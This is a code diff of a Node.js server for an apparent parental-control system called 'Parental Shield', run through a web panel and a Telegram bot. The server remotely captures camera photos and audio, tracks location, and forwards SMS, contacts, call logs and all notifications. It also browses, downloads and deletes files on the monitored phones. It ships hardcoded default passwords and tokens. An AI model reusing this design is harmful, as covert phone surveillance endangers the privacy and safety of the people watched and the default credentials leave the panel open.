@@ -1,17 +1,16 @@
 // Parental Shield — Unified Server v2.0
 // Web Admin Panel + Telegram Bot + Telegram Mini App
 
-require('dotenv').config(); // Load .env variables
+require('dotenv').config();
 
-const express     = require('express');
-
-// ── Global error guards — prevent any unhandled error from crashing the server ──
+const express = require('express');
 process.on('uncaughtException', (err) => {
   console.error('[FATAL] Uncaught Exception (server kept alive):', err.message);
 });
 process.on('unhandledRejection', (reason) => {
   console.error('[FATAL] Unhandled Promise Rejection (server kept alive):', reason);
 });
+
 const http        = require('http');
 const WebSocket   = require('ws');
 const path        = require('path');
@@ -21,26 +20,25 @@ const PORT           = process.env.PORT         || 3000;
 const SECURITY_TOKEN = process.env.SHIELD_TOKEN || "GAJARBOTOL80";
 const BOT_TOKEN      = process.env.BOT_TOKEN    || "";
 const ADMIN_TG_ID    = Number(process.env.ADMIN_TG_ID) || 5197344486;
-const PANEL_PASSWORD = process.env.PANEL_PASSWORD || "Shield@2025"; // Web panel password
+const PANEL_PASSWORD = process.env.PANEL_PASSWORD || "Shield@2025";
 const PUBLIC_URL     = (process.env.PUBLIC_URL  || "").replace(/\/$/, "");
 
-const app    = express();
+const app = express();
 const server = http.createServer(app);
 app.use(express.json());
+
 // ── Simple session store (in-memory) ──────────────────────────────────────
-const activeSessions = new Set(); // token → valid
+const activeSessions = new Set();
 
 function generateToken() {
   return Math.random().toString(36).substring(2) + Date.now().toString(36);
 }
 
-// Login endpoint
 app.post('/api/login', (req, res) => {
   const { password } = req.body;
   if (password === PANEL_PASSWORD) {
     const token = generateToken();
     activeSessions.add(token);
-    // Auto-expire session after 24h
     setTimeout(() => activeSessions.delete(token), 24 * 60 * 60 * 1000);
     res.json({ success: true, token });
   } else {
@@ -48,20 +46,17 @@ app.post('/api/login', (req, res) => {
   }
 });
 
-// Logout
 app.post('/api/logout', (req, res) => {
   const token = req.headers['x-shield-token'];
   if (token) activeSessions.delete(token);
   res.json({ success: true });
 });
 
-// Auth check
 app.get('/api/auth-check', (req, res) => {
   const token = req.headers['x-shield-token'];
   res.json({ valid: token && activeSessions.has(token) });
 });
 
-// Status (public)
 app.get('/api/status', (req, res) => {
   res.json({ devices: childDevices.size, uptime: process.uptime(), botActive: !!bot });
 });
@@ -75,7 +70,7 @@ const childDevices = new Map();
 const adminSockets = new Set();
 
 // Pending device selections per Telegram chat
-const botDeviceSelection = new Map(); // chatId → deviceId
+const botDeviceSelection = new Map();
 
 // ════════════════════════════════════════════════════════════════════
 // TELEGRAM BOT
@@ -83,7 +78,7 @@ const botDeviceSelection = new Map(); // chatId → deviceId
 
 let bot = null;
 
-// ── Markdown escape utility ─────────────────────────────────────────
+// ── Markdown escape utility ─────────────────────────────────────────────
 function escapeMd(text) {
   if (!text) return '';
   return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
@@ -93,7 +88,6 @@ function escapeMd(text) {
 // BOT FILE BROWSER HELPERS
 // ════════════════════════════════════════════════════════════════════
 
-// Common base paths (short name → full Android path)
 const FOLDER_SHORTCUTS = {
   'download':      '/storage/emulated/0/Download',
   'downloads':     '/storage/emulated/0/Download',
@@ -110,7 +104,6 @@ const FOLDER_SHORTCUTS = {
   'root':          '/storage/emulated/0',
 };
 
-// Extension → category
 function getFileCategory(filename) {
   const ext = filename.split('.').pop().toLowerCase();
   if (['jpg','jpeg','png','gif','webp','bmp','heic'].includes(ext)) return 'image';
@@ -157,9 +150,7 @@ function decodeCachedPath(key) {
 function resolveFolderPath(input) {
   const lower = input.trim().toLowerCase();
   if (FOLDER_SHORTCUTS[lower]) return FOLDER_SHORTCUTS[lower];
-  // If starts with / treat as absolute
   if (input.startsWith('/')) return input;
-  // Otherwise prepend /storage/emulated/0/
   return '/storage/emulated/0/' + input;
 }
 
@@ -171,23 +162,18 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt) {
   const devName  = getDeviceName(deviceId);
   const folderName = curPath.split('/').filter(Boolean).pop() || curPath;
 
-  // Separate folders and files
   const folders = items.filter(i => i.isDirectory);
   const files   = items.filter(i => !i.isDirectory);
 
-  // Apply extension/category filter
   let filtered = files;
   if (filterExt && filterExt !== 'all') {
     if (filterExt.startsWith('.')) {
-      // specific extension like .trashed .jpg
       filtered = files.filter(f => f.name.toLowerCase().endsWith(filterExt.toLowerCase()));
     } else {
-      // category filter: image, video, audio, doc, trashed, apk
       filtered = files.filter(f => getFileCategory(f.name) === filterExt);
     }
   }
 
-  // Build category summary
   const cats = {};
   for (const f of files) {
     const c = getFileCategory(f.name);
@@ -197,13 +183,12 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt) {
     .map(([c,n]) => `${getCategoryEmoji(c)} ${n}`)
     .join('  ');
 
-  // Escape all dynamic texts for Markdown
-  const escapedFolder = escapeMd(folderName);
-  const escapedDev    = escapeMd(devName);
-  const escapedPath   = escapeMd(curPath); // inside backticks it's safe but we escape anyway to be safe
+  const escFolder = escapeMd(folderName);
+  const escDev    = escapeMd(devName);
+  const escPath   = escapeMd(curPath);
 
-  let text = `📂 *${escapedFolder}*  (${escapedDev})\n`;  // removed backslashes, using escapedDev
-  text += `\`${escapedPath}\`\n`;
+  let text = `📂 *${escFolder}*  (${escDev})\n`;
+  text += `\`${escPath}\`\n`;
   text += `${'─'.repeat(26)}\n`;
   text += `📊 Total: ${files.length} file  ${catSummary}\n`;
   if (filterExt && filterExt !== 'all') {
@@ -217,9 +202,8 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt) {
       : `_Ei folder e kono file nai._`;
   }
 
-  // Build filter row buttons
+  // Filter row buttons
   const filterButtons = [];
-  const catKeys = Object.keys(cats);
   const catRow1 = [], catRow2 = [];
   const allCats = ['image','video','audio','doc','apk','trashed','archive'];
   const presentCats = allCats.filter(c => cats[c]);
@@ -232,19 +216,17 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt) {
   if (catRow1.length) filterButtons.push(catRow1);
   if (catRow2.length) filterButtons.push(catRow2);
 
-  // "All files" + extension search buttons
   filterButtons.push([
     { text: filterExt === 'all' || !filterExt ? '✓ All files' : '📄 All files', callback_data: `fb:filter:${deviceId}:${getCachedPathKey(curPath)}:all` },
     { text: '🗑️ .trashed', callback_data: `fb:filter:${deviceId}:${getCachedPathKey(curPath)}:.trashed` },
   ]);
 
-  // File list buttons (max 20 files shown)
+  // File list buttons
   const fileButtons = [];
   const showFiles = filtered.slice(0, 20);
   for (const file of showFiles) {
     const emoji = getCategoryEmoji(getFileCategory(file.name));
     const sizeStr = formatSize(file.size);
-    // Button text doesn't need escaping
     const label = `${emoji} ${file.name.length > 28 ? file.name.slice(0,25)+'...' : file.name}  (${sizeStr})`;
     fileButtons.push([{ text: label, callback_data: `fb:file:${deviceId}:${getCachedPathKey(file.path)}` }]);
   }
@@ -290,19 +272,17 @@ async function handleBotFileDownload(chatId, deviceId, payload) {
     const buffer = Buffer.from(base64, 'base64');
     const ext    = name.split('.').pop().toLowerCase();
 
-    // Check file size (Telegram Bot API HTTP limit 50MB)
     if (buffer.length > 50 * 1024 * 1024) {
       bot.sendMessage(chatId, `⚠️ ফাইল সাইজ (${formatSize(buffer.length)}) অনেক বড় (টেলিগ্রাম বটের লিমিট ৫০এমবি)। অনুগ্রহ করে ওয়েব এডমিন প্যানেল ব্যবহার করে ফাইলটি ডাউনলোড করে নিন!`);
       return;
     }
 
     const escapedName = escapeMd(name);
-    // Send a status message
     await bot.sendMessage(chatId, `⬇️ Sending: *${escapedName}* (${formatSize(buffer.length)})…`, { parse_mode: 'Markdown' });
 
-    const imageExts  = ['jpg','jpeg','png','gif','webp'];
-    const videoExts  = ['mp4','3gp','mov'];
-    const audioExts  = ['mp3','m4a','aac','ogg'];
+    const imageExts = ['jpg','jpeg','png','gif','webp'];
+    const videoExts = ['mp4','3gp','mov'];
+    const audioExts = ['mp3','m4a','aac','ogg'];
 
     if (imageExts.includes(ext)) {
       await bot.sendPhoto(chatId, buffer, { caption: `📷 ${escapedName}` }, { filename: name });
@@ -320,19 +300,17 @@ async function handleBotFileDownload(chatId, deviceId, payload) {
   }
 }
 
-// ── Photo notify ──────────────────────────────────────────────────────────
+// ── Notify functions ─────────────────────────────────────────────────────
 async function notifyAdminPhoto(deviceId, childName, dataUrl, facing) {
   if (!bot) return;
   try {
-    const b64  = dataUrl.replace(/^data:image\/\w+;base64,/, '');
-    const buf  = Buffer.from(b64, 'base64');
-    const escapedChild = escapeMd(childName);
-    const cap  = `📷 *${escapedChild}* — ${facing === 'front' ? 'Front' : 'Back'} Camera\n${new Date().toLocaleTimeString()}`;
+    const b64 = dataUrl.replace(/^data:image\/\w+;base64,/, '');
+    const buf = Buffer.from(b64, 'base64');
+    const cap = `📷 *${escapeMd(childName)}* — ${facing === 'front' ? 'Front' : 'Back'} Camera\n${new Date().toLocaleTimeString()}`;
     await bot.sendPhoto(ADMIN_TG_ID, buf, { caption: cap, parse_mode: 'Markdown' }, { filename: 'photo.jpg', contentType: 'image/jpeg' });
   } catch (e) { console.error('[BOT] Photo notify error:', e.message); }
 }
 
-// ── Audio notify ──────────────────────────────────────────────────────────
 async function notifyAdminAudio(deviceId, childName, dataUrl, duration) {
   if (!bot) return;
   try {
@@ -344,7 +322,6 @@ async function notifyAdminAudio(deviceId, childName, dataUrl, duration) {
   } catch (e) { console.error('[BOT] Audio notify error:', e.message); }
 }
 
-// ── Location notify ───────────────────────────────────────────────────────
 function notifyAdminLocation(deviceId, childName, loc) {
   if (!bot) return;
   try {
@@ -358,7 +335,6 @@ function notifyAdminLocation(deviceId, childName, loc) {
   } catch (e) { console.error('[BOT] Location notify error:', e.message); }
 }
 
-// ── Incoming SMS notify ───────────────────────────────────────────────────
 function notifyAdminSms(deviceId, childName, sender, body, time) {
   if (!bot) return;
   try {
@@ -434,6 +410,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
   } catch (e) { console.error('[BOT] Data result error:', e.message); }
 }
 
+// ── Bot initialization ───────────────────────────────────────────────────
 function initTelegramBot() {
   if (!BOT_TOKEN) {
     console.warn("[BOT] BOT_TOKEN not set — Telegram bot disabled.");
@@ -463,7 +440,6 @@ function initTelegramBot() {
   }
 
   // ── Keyboard builders ─────────────────────────────────────────────────
-
   const MAIN_REPLY_KB = {
     keyboard: [
       [{ text: "📱 Devices" }, { text: "🖥️ Full Panel" }],
@@ -542,7 +518,6 @@ function initTelegramBot() {
   }
 
   // ── Send / edit helpers ───────────────────────────────────────────────
-
   function sendMainMenu(chatId) {
     bot.sendMessage(chatId,
       `🛡️ *Parental Shield*\n\nNiche er button gulo use koro:`,
@@ -630,7 +605,6 @@ function initTelegramBot() {
   }
 
   // ── /start + reply keyboard text handlers ─────────────────────────────
-
   bot.onText(/\/start/, (msg) => adminOnly(msg, () => {
     const state = getState(msg.chat.id);
     state.awaitingInput = null;
@@ -693,7 +667,6 @@ function initTelegramBot() {
 
       sendCommandToDevice(devId, { command: 'list_dir', path: resolvedPath });
 
-      // Timeout fallback (10s)
       setTimeout(() => {
         if (pendingBotFileRequests.get(devId)?.chatId === chatId) {
           pendingBotFileRequests.delete(devId);
@@ -751,7 +724,6 @@ function initTelegramBot() {
       });
       return;
     }
-    // Ignore /start (handled above) and other slash commands gracefully
     if (text.startsWith("/") && text !== "/start") {
       bot.sendMessage(chatId, "💡 Niche er button gulo use koro:", { reply_markup: MAIN_REPLY_KB });
       return;
@@ -759,7 +731,6 @@ function initTelegramBot() {
   });
 
   // ── Inline button callback handler ────────────────────────────────────
-
   bot.on('callback_query', async (query) => {
     if (!isAdmin(query.from.id)) {
       bot.answerCallbackQuery(query.id, { text: "⛔ Access denied." });
@@ -806,7 +777,26 @@ function initTelegramBot() {
         return;
       }
 
-      // Actions needing follow-up text input
+      // ═══════════════════ FILE BROWSER ═══════════════════
+      if (action === "files") {
+        state.selectedDeviceId = deviceId;
+        state.awaitingInput    = 'folder';
+        bot.answerCallbackQuery(query.id);
+        bot.sendMessage(chatId,
+          `✏️ *Custom Folder Path*\n\n` +
+          `📂 Folder er naam ba full path likho:\n\n` +
+          `*Short names (auto resolve):*\n` +
+          `\`Download\`  \`DCIM/Camera\`  \`Pictures\`\n` +
+          `\`WhatsApp\`  \`Telegram\`  \`Documents\`\n\n` +
+          `*Full path:*\n` +
+          `\`/storage/emulated/0/Download\`\n\n` +
+          `_🔍 Sob file dekhabe, even .trash / dot files_`,
+          { parse_mode: 'Markdown' }
+        );
+        return;
+      }
+
+      // ── screentime ─────────────────────────────────────────────────
       if (action === "screentime") {
         state.selectedDeviceId = deviceId;
         state.awaitingInput    = "screentime";
@@ -839,6 +829,7 @@ function initTelegramBot() {
         return;
       }
 
+      // ── policy ──────────────────────────────────────────────────────
       if (action === "policy") {
         state.selectedDeviceId = deviceId;
         state.awaitingInput    = null;
@@ -1011,7 +1002,6 @@ Kon inbox dekhte chao?`, {
         wifi_off:     "📵 WiFi OFF command sent",
       };
       bot.answerCallbackQuery(query.id, { text: ackLabels[action] || `✅ ${action} sent`, show_alert: false });
-      // Refresh the device card after a moment
       setTimeout(() => sendDeviceCard(chatId, deviceId, msgId), 800);
       return;
     }
@@ -1075,7 +1065,6 @@ Kon inbox dekhte chao?`, {
         return;
       }
 
-      // Append to existing blocked list
       const existing  = (dev?.blockedApps || "").split(",").map(s => s.trim()).filter(Boolean);
       if (!existing.includes(pkg)) existing.push(pkg);
       const newBlocked = existing.join(",");
@@ -1104,7 +1093,7 @@ Kon inbox dekhte chao?`, {
     // ── sms: inbox/sent/all ──────────────────────────────────────────────
     if (data.startsWith('sms:')) {
       const parts  = data.split(':');
-      const box    = parts[1]; // inbox|sent|all
+      const box    = parts[1];
       const devId  = parts[2];
       if (!childDevices.has(devId)) { bot.answerCallbackQuery(query.id, { text: '❌ Device offline.' }); return; }
       bot.answerCallbackQuery(query.id, { text: `💬 Loading ${box}…` });
@@ -1120,13 +1109,11 @@ Kon inbox dekhte chao?`, {
       const parts = data.split(':');
       const fbAction = parts[1];
 
-      // fb:noop — do nothing
       if (fbAction === 'noop') {
         bot.answerCallbackQuery(query.id, { text: 'Sob file dekhte custom path use koro.' });
         return;
       }
 
-      // fb:custom:deviceId — ask for custom path
       if (fbAction === 'custom') {
         const devId = parts[2];
         state.selectedDeviceId = devId;
@@ -1154,7 +1141,6 @@ Kon inbox dekhte chao?`, {
         return;
       }
 
-      // fb:trash:deviceId — search .trashed files in Download
       if (fbAction === 'trash') {
         const devId = parts[2];
         state.selectedDeviceId = devId;
@@ -1179,7 +1165,6 @@ Kon inbox dekhte chao?`, {
         return;
       }
 
-      // fb:nav:deviceId:encodedPath:filterExt — navigate to folder
       if (fbAction === 'nav') {
         const devId     = parts[2];
         const rawPath   = decodeCachedPath(parts[3]);
@@ -1209,7 +1194,6 @@ Kon inbox dekhte chao?`, {
         return;
       }
 
-      // fb:filter:deviceId:encodedPath:filterExt — refilter current listing
       if (fbAction === 'filter') {
         const devId     = parts[2];
         const rawPath   = decodeCachedPath(parts[3]);
@@ -1236,7 +1220,6 @@ Kon inbox dekhte chao?`, {
         return;
       }
 
-      // fb:file:deviceId:encodedPath — show file options (download / delete)
       if (fbAction === 'file') {
         const devId    = parts[2];
         const filePath = decodeCachedPath(parts[3]);
@@ -1265,7 +1248,6 @@ Kon inbox dekhte chao?`, {
         return;
       }
 
-      // fb:dl:deviceId:encodedPath — download file
       if (fbAction === 'dl') {
         const devId    = parts[2];
         const filePath = decodeCachedPath(parts[3]);
@@ -1290,7 +1272,6 @@ Kon inbox dekhte chao?`, {
         return;
       }
 
-      // fb:del:deviceId:encodedPath — delete file (with confirm)
       if (fbAction === 'del') {
         const devId    = parts[2];
         const filePath = decodeCachedPath(parts[3]);
@@ -1315,7 +1296,6 @@ Nischit delete korte chao?`,
         return;
       }
 
-      // fb:delok:deviceId:encodedPath — confirmed delete
       if (fbAction === 'delok') {
         const devId    = parts[2];
         const filePath = decodeCachedPath(parts[3]);
@@ -1327,10 +1307,8 @@ Nischit delete korte chao?`,
         }
         bot.answerCallbackQuery(query.id, { text: '🗑️ Deleting…' });
         sendCommandToDevice(devId, { command: 'delete_file', path: filePath });
-        // Go back to folder after 1.5s
         setTimeout(() => {
           bot.sendMessage(chatId, `✅ *${escapeMd(fileName)}* deleted.`, { parse_mode: 'Markdown' });
-          // Reload the folder listing
           const loadMsg2 = bot.sendMessage(chatId, `🔄 Folder reload hocche…`);
           loadMsg2.then(m => {
             pendingBotFileRequests.set(devId, {
@@ -1353,9 +1331,7 @@ Nischit delete korte chao?`,
   console.log("[BOT] All handlers registered (button-driven mode).");
 }
 
-
 // ── Bot notification helpers ─────────────────────────────────────────────
-
 function notifyAdmin(text, opts = {}) {
   if (!bot) return;
   bot.sendMessage(ADMIN_TG_ID, text, { parse_mode: "Markdown", ...opts }).catch(e => {
@@ -1425,7 +1401,6 @@ function notifyCommandAck(deviceId, childName, command, success, message) {
 }
 
 // ── Send command to child device ─────────────────────────────────────────
-
 function sendCommandToDevice(deviceId, cmdPayload) {
   const dev = childDevices.get(deviceId);
   if (!dev) return false;
@@ -1476,10 +1451,7 @@ function broadcastToAdmins(payload) {
   }
 }
 
-// ── Low battery tracker (fire once per session per device) ────────────
 const lowBatteryAlerted = new Set();
-
-// ── Pending Bot File Requests ─────────────────────────────────────────
 const pendingBotFileRequests = new Map();
 
 // ════════════════════════════════════════════════════════════════════
@@ -1542,7 +1514,6 @@ wss.on('connection', (ws, req) => {
           dev.screenTimeUsedMin  = payload.screenTimeUsedMin  ?? dev.screenTimeUsedMin;
           dev.screenTimeLimitMin = payload.screenTimeLimitMin ?? dev.screenTimeLimitMin;
 
-          // Low battery alert (once per session)
           if (dev.battery <= 15 && !lowBatteryAlerted.has(deviceId)) {
             lowBatteryAlerted.add(deviceId);
             notifyBatteryLow(deviceId, dev.childName, dev.battery);
@@ -1573,7 +1544,6 @@ wss.on('connection', (ws, req) => {
             app: payload.app, title: payload.title,
             text: payload.text, time: notifTime
           });
-          // Forward ALL notifications to Telegram
           if (bot) {
             const appLabel = payload.app || 'Unknown';
             const msgTitle = payload.title || '';
@@ -1600,7 +1570,6 @@ wss.on('connection', (ws, req) => {
 
         } else if (payload.type === 'photo_result') {
           broadcastToAdmins({ ...payload, deviceId });
-          // Notify bot
           if (bot) notifyAdminPhoto(deviceId, dev.childName, payload.image, payload.facing);
 
         } else if (payload.type === 'audio_result') {
@@ -1618,7 +1587,6 @@ wss.on('connection', (ws, req) => {
         } else if (payload.type === 'get_info_result') {
           payload.deviceId = deviceId;
           broadcastToAdmins(payload);
-          // Send device info to Telegram if pending
           const prGI = pendingBotFileRequests.get(deviceId + '_data');
           if (prGI && bot && prGI.type === 'get_info_result') {
             pendingBotFileRequests.delete(deviceId + '_data');
@@ -1637,7 +1605,6 @@ wss.on('connection', (ws, req) => {
 
         } else if (payload.type === 'call_log_result' || payload.type === 'sms_result' ||
                    payload.type === 'contacts_result' || payload.type === 'installed_apps_result') {
-          // These are large payloads — only send to the pending bot request if any
           payload.deviceId = deviceId;
           broadcastToAdmins(payload);
           const pr = pendingBotFileRequests.get(deviceId + '_data');
@@ -1647,11 +1614,9 @@ wss.on('connection', (ws, req) => {
           }
 
         } else if (payload.type === 'file_manager_response') {
-          // Route to web admin panel
           payload.deviceId = deviceId;
           broadcastToAdmins(payload);
 
-          // Route to waiting Telegram bot request (if any)
           const pending = pendingBotFileRequests.get(deviceId);
           if (pending) {
             if (payload.action === 'list_dir_result' && pending.type === 'list_dir') {
@@ -1732,6 +1697,5 @@ server.listen(PORT, () => {
   console.log(` Public URL: ${PUBLIC_URL || "Not set (Mini App won't work)"}`);
   console.log(`══════════════════════════════════════════════════\n`);
 
-  // Init bot AFTER server is listening — so web panel always works even if bot fails
   initTelegramBot();
 });
